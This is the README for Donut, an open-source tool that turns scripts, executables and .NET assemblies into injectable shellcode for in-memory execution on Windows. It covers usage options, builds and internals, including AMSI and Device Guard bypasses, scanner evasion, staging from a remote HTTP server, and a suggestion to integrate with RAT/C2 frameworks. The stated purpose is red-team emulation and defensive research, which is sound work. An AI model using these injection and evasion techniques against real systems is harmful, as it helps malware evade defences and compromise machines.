[![Issues](https://img.shields.io/github/issues/thewover/donut)](https://github.com/TheWover/donut/issues)
[![Contributors](https://img.shields.io/github/contributors/thewover/donut)](https://github.com/TheWover/donut/graphs/contributors)
[![Stars](https://img.shields.io/github/stars/thewover/donut)](https://github.com/TheWover/donut/stargazers)
[![Forks](https://img.shields.io/github/forks/thewover/donut)](https://github.com/TheWover/donut/network/members)
[![License](https://img.shields.io/github/license/thewover/donut)](https://github.com/TheWover/donut/blob/master/LICENSE)
[![Chat](https://img.shields.io/badge/chat-%23donut-orange)](https://bloodhoundgang.herokuapp.com/)
[![Github All Releases](https://img.shields.io/github/downloads/thewover/donut/total.svg)](http://www.somsubhra.com/github-release-stats/?username=thewover&repository=donut) 
[![Twitter URL](https://img.shields.io/twitter/url/http/shields.io.svg?style=social)](https://twitter.com/intent/tweet?original_referer=https://github.com/TheWover/donut&text=%23Donut+An+open-source+shellcode+generator+for+VBS%2FJS%2FEXE%2FDLL+files:+https://github.com/TheWover/donut)

# Using Donut

![Alt text](https://github.com/TheWover/donut/blob/master/img/donut.PNG?raw=true "An ASCII donut")

Version: 0.9.3 *please submit issues and requests for v1.0 release*

Odzhan's blog post (about the generator): https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/

TheWover's blog post (detailed walkthrough, and about how donut affects tradecraft): https://thewover.github.io/Introducing-Donut/

v0.9.2 release blog post: https://thewover.github.io/Bear-Claw/

## Introduction

Donut generates x86 or x64 shellcode from VBScript, JScript, EXE, DLL (including .NET Assemblies) files. This shellcode can be injected into an arbitrary Windows process for in-memory execution. Given a supported file type, parameters and an entry point where applicable (such as Program.Main), it produces position-independent shellcode that loads and runs entirely from memory. A module created by donut can either be staged from a HTTP server or stageless by being embedded directly in the shellcode. Either way, the module is encrypted with the Chaskey block cipher and a 128-bit randomly generated key. After the file is loaded through the PE/ActiveScript/CLR loader, the original reference is erased from memory to deter memory scanners. For .NET Assemblies, they are loaded into a new Application Domain to allow for running Assemblies in disposable AppDomains.

It can be used in several ways.

## As a Standalone Tool

Donut can be used as-is to generate shellcode from VBS/JS/EXE/DLL files or .NET Assemblies. A Linux and Windows executable and a Python module are provided for loader generation. The Python documentation can be found [here](https://github.com/TheWover/donut/blob/master/docs/2019-08-21-Python_Extension.md). The command-line syntax is as described below.

```
 usage: donut [options] <EXE/DLL/VBS/JS>

       Only the finest artisanal donuts are made of shells.

                   -MODULE OPTIONS-

       -n <name>            Module name. Randomly generated by default with entropy enabled.
       -s <server>          HTTP server that will host the donut module.
       -e <level>           Entropy. 1=none, 2=use random names, 3=random names + symmetric encryption (default)

                   -PIC/SHELLCODE OPTIONS-

       -a <arch>            Target architecture : 1=x86, 2=amd64, 3=x86+amd64(default).
       -b <level>           Bypass AMSI/WLDP : 1=none, 2=abort on fail, 3=continue on fail.(default)
       -o <path>            Output file to save loader. Default is "loader.bin"
       -f <format>          Output format. 1=binary (default), 2=base64, 3=c, 4=ruby, 5=python, 6=powershell, 7=C#, 8=hex
       -y <oep>             Create a new thread for loader. Optionally execute original entrypoint of host process.
       -x <action>          Exiting. 1=exit thread (default), 2=exit process

                   -FILE OPTIONS-

       -c <namespace.class> Optional class name. (required for .NET DLL)
       -d <name>            AppDomain name to create for .NET. Randomly generated by default with entropy enabled.
       -m <method | api>    Optional method or function for DLL. (a method is required for .NET DLL)
       -p <parameters>      Optional parameters/command line inside quotations for DLL method/function or EXE.
       -w                   Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)
       -r <version>         CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.
       -t                   Create new thread for entrypoint of unmanaged EXE.
       -z <engine>          Pack/Compress file. 1=none, 2=aPLib, 3=LZNT1, 4=Xpress, 5=Xpress Huffman

 examples:

    donut c2.dll
    donut -a1 -cTestClass -mRunProcess -pnotepad.exe loader.dll
    donut loader.dll -c TestClass -m RunProcess -p"calc notepad" -s http://remote_server.com/modules/
```

### Building Donut

Tags have been provided for each release version of donut that contain the compiled executables. 

* v0.9.3, TBD: https://github.com/TheWover/donut/releases/tag/v0.9.3
* v0.9.2, Bear Claw: https://github.com/TheWover/donut/releases/tag/v0.9.2
* v0.9.2 Beta: https://github.com/TheWover/donut/releases/tag/v0.9.2
* v0.9.1, Apple Fritter: https://github.com/TheWover/donut/releases/tag/v0.9.1
* v0.9, Initial Release: https://github.com/TheWover/donut/releases/tag/v0.9

However, you may also clone and build the source yourself using the provided makefiles. 

## Building From Repository

From a Windows command prompt or Linux terminal, clone the repository and change to the donut directory.

```
git clone http://github.com/thewover/donut
cd donut
```

## GNU Compiler Collection (GCC)

Compiling the loader on Linux without MinGW installed is currently not supported.
Simply run make to build the generator, static and dynamic libraries. If you need to track down problems, use the debug label.

```
make
make debug
```

## Microsoft Visual Studio

Start a Microsoft Visual Studio Developer Command Prompt and `` cd `` to donut's directory. The Microsft (non-gcc) Makefile can be specified with ``` -f Makefile.msvc ```. The makefile provides the following commmands to build donut:

```
nmake -f Makefile.msvc
nmake debug -f Makefile.msvc
```

## MinGW-64

The loader, generator, dynamic and static libraries can be compiled if MinGW-64 is installed.

```
make -f Makefile.mingw
make debug -f Makefile.mingw
```

## As a Library

Donut can be compiled as both dynamic and static libraries for both Linux (*.a* / *.so*) and Windows(*.lib* / *.dll*). It has a simple API that is described <a href="https://github.com/TheWover/donut/blob/master/docs/api.md">here</a>. Three exported functions are provided: ``` int DonutCreate(PDONUT_CONFIG c) ```, ```int DonutDelete(PDONUT_CONFIG c)``` and ```const char* DonutError(int error)```.

## As a Python Module

Donut can be installed and used as a Python module. To install Donut from source, use pip for Python3.
First, ensure older versions of donut-shellcode are not installed.

```
pip3 uninstall donut-shellcode
```

After you confirm removal, install from source with the following command.

```
pip3 install .
```

You may also install Donut as a Python module by grabbing it from the PyPi repostiory.

```
pip3 install donut-shellcode
```

## Bypasses

Donut includes a bypass system for AMSI and other security features. Currently we bypass:

* AMSI in .NET v4.8
* Device Guard policy preventing dynamically generated code from executing

You may customize our bypasses or add your own. The bypass logic is defined in loader/bypass.c.

Each bypass implements the DisableAMSI fuction with the signature ```BOOL DisableAMSI(PDONUT_INSTANCE inst)```, and comes with a corresponding preprocessor directive. We have several ```#if defined``` blocks that check for definitions. Each block implements the same bypass function. For instance, our first bypass is called ```BYPASS_AMSI_A```. If donut is built with that variable defined, then that bypass will be used.

Why do it this way? Because it means that only the bypass you are using is built into loader.exe. As a result, the others are not included in your shellcode. This reduces the size and complexity of your shellcode, adds modularity to the design, and ensures that scanners cannot find suspicious blocks in your shellcode that you are not actually using.

Another benefit of this design is that you may write your own AMSI bypass. To build Donut with your new bypass, use an ```if defined``` block for your bypass and modify the makefile to add an option that builds with the name of your bypass defined.

If you wanted to, you could extend our bypass system to add in other pre-execution logic that runs before your .NET Assembly is loaded. 

Odzhan wrote a [blog post](https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/) on the details of our AMSI bypass research.

### Additional features.

These are left as exercises to the reader. I would personally recommend:

* Add environmental keying
* Make donut polymorphic by obfuscating *loader* every time shellcode is generated
* Integrate donut as a module into your favorite RAT/C2 Framework

## Disclaimers

* No, we will not update donut to counter signatures or detections by any AV.
* We are not responsible for any misuse of this software or technique. Donut is provided as a demonstration of CLR Injection through shellcode in order to provide red teamers a way to emulate adversaries and defenders a frame of reference for building analytics and mitigations. This inevitably runs the risk of malware authors and threat actors misusing it. However, we believe that the net benefit outweighs the risk. Hopefully that is correct.

# How it works

## Procedure for Assemblies

Donut uses the Unmanaged CLR Hosting API to load the Common Language Runtime. If necessary, the Assembly is downloaded into memory. Either way, it is decrypted using the Chaskey block cipher. Once the CLR is loaded into the host process, a new AppDomain will be created using a random name unless otherwise specified. Once the AppDomain is ready, the .NET Assembly is loaded through AppDomain.Load_3. Finally, the Entry Point specified by the user is invoked with any specified parameters.

The logic above describes how the shellcode generated by donut works. That logic is defined in *loader.exe*. To get the shellcode, *exe2h* extracts the compiled machine code from the *.text* segment in *loader.exe* and saves it as a C array to a C header file. *donut* combines the shellcode with a Donut Instance (a configuration for the shellcode) and a Donut Module (a structure containing the .NET assembly, class name, method name and any parameters).

Refer to MSDN for documentation on the Undocumented CLR Hosting API: https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/clr-hosting-interfaces

For a standalone example of a CLR Host, refer to Casey Smith's AssemblyLoader repo: https://github.com/caseysmithrc/AssemblyLoader

Detailed blog posts about how donut works are available at both Odzhan's and TheWover's blogs. Links are at the top of the README.

## Procedure for ActiveScript

The details of how Donut loads scripts from memory have been detailed by Odzhan in a [blog post](https://modexp.wordpress.com/2019/07/21/inmem-exec-script/).

## Procedure for PE Loading

The details of how Donut loads PE files from memory have been detailed by Odzhan in a [blog post](https://modexp.wordpress.com/2019/06/24/inmem-exec-dll/).

Only PE files with relocation information (.reloc) are supported. TLS callbacks are only executed for the initial execution of entrypoint.

## Components

Donut contains the following elements:

<table>
  <tr>
    <th>File</th>
    <th>Description</th>
  </tr>
  <tr>
    <td>donut.c</td>
    <td>Shellcode generator.</td>
  </tr>
  <tr>
    <td>include/donut.h</td>
    <td>C header file used by the generator.</td>
  </tr>
  <tr>
    <td>lib/donut.dll and lib/donut.lib</td>
    <td>Dynamic and static libraries for Microsoft Windows.</td>
  </tr>
  <tr>
    <td>lib/donut.so and lib/donut.a</td>
    <td>Dynamic and static libraries for Linux.</td>
  </tr>
  <tr>
    <td>lib/donut.h</td>
    <td>C header file to be used for C/C++ based projects.</td>
  </tr>
  <tr>
    <td>donutmodule.c</td>
    <td>The CPython wrapper for Donut. Used by the Python module.</td>
  </tr>
  <tr>
    <td>setup.py</td>
    <td>The setup file for installing Donut as a Pip Python3 module.</td>
  </tr>
  <tr>
    <td>hash.c</td>
    <td>Maru hash function. Uses the Speck 64-bit block cipher with Davies-Meyer construction for API hashing.</td>
  </tr>
  <tr>
    <td>encrypt.c</td>
    <td>Chaskey block cipher for encrypting modules.</td>
  </tr>
  <tr>
    <td>loader/loader.c</td>
    <td>Main file for the shellcode.</td>
  </tr>
  <tr>
    <td>loader/inmem_dotnet.c</td>
    <td>In-Memory loader for .NET EXE/DLL assemblies.</td>
  </tr>
  <tr>
    <td>loader/inmem_pe.c</td>
    <td>In-Memory loader for EXE/DLL files.</td>
  </tr>
  <tr>
    <td>loader/inmem_script.c</td>
    <td>In-Memory loader for VBScript/JScript files.</td>
  </tr>
  <tr>
    <td>loader/activescript.c</td>
    <td>ActiveScriptSite interface required for in-memory execution of VBS/JS files.</td>
  </tr>
  <tr>
    <td>loader/wscript.c</td>
    <td>Supports a number of WScript methods that cscript/wscript support.</td>
  </tr>
  <tr>
    <td>loader/depack.c</td>
    <td>Supports unpacking of modules compressed with aPLib.</td>
  </tr>
  <tr>
    <td>loader/bypass.c</td>
    <td>Functions to bypass Anti-malware Scan Interface (AMSI) and Windows Local Device Policy (WLDP).</td>
  </tr>
  <tr>
    <td>loader/http_client.c</td>
    <td>Downloads a module from remote staging server into memory.</td>
  </tr>
  <tr>
    <td>loader/peb.c</td>
    <td>Used to resolve the address of DLL functions via Process Environment Block (PEB).</td>
  </tr>
  <tr>
    <td>loader/clib.c</td>
    <td>Replaces common C library functions like memcmp, memcpy and memset.</td>
  </tr>
  <tr>
    <td>loader/getpc.c</td>
    <td>Assembly code stub to return the value of the EIP register.</td>
  </tr>
  <tr>
    <td>loader/inject.c</td>
    <td>Simple process injector for Windows that can be used for testing the loader.</td>
  </tr>
  <tr>
    <td>loader/runsc.c</td>
    <td>Simple shellcode runner for Linux and Windows that can be used for testing the loader.</td>
  </tr>
  <tr>
    <td>loader/exe2h/exe2h.c</td>
    <td>Extracts the machine code from compiled loader and saves as array to C header and Go files.</td>
  </tr>
</table>

# Subprojects

There are three companion projects provided with donut:

<table>
  <tr>
    <th>Tool</th>
    <th>Description</th>
  </tr>
  <tr>
    <td>DemoCreateProcess</td>
    <td>A sample .NET Assembly to use in testing. Takes two command-line parameters that each specify a program to execute.</th>
  </tr>
  <tr>
    <td>DonutTest</td>
    <td>A simple C# shellcode injector to use in testing donut. The shellcode must be base64 encoded and copied in as a string.</th>
  </tr>
  <tr>
    <td>ModuleMonitor</td>
    <td>A proof-of-concept tool that detects CLR injection as it is done by tools such as Donut and Cobalt Strike's execute-assembly.</th>
  </tr>
  <tr>
    <td>ProcessManager</td>
    <td>A Process Discovery tool that offensive operators may use to determine what to inject into and defensive operators may use to determine what is running, what properties those processes have, and whether or not they have the CLR loaded. </th>
  </tr>
</table>

# Project plan

* Create a donut.py generator that uses the same command-line parameters as donut.exe.
* Add support for HTTP proxies.
* Write a blog post on how to integrate donut into your tooling, debug it, customize it, and design loaders that work with it.

### Questions and Discussion

Have questions or want to chat more about Donut? Join the #Donut channel in the [BloodHound Gang Slack](https://bloodhoundgang.herokuapp.com/).
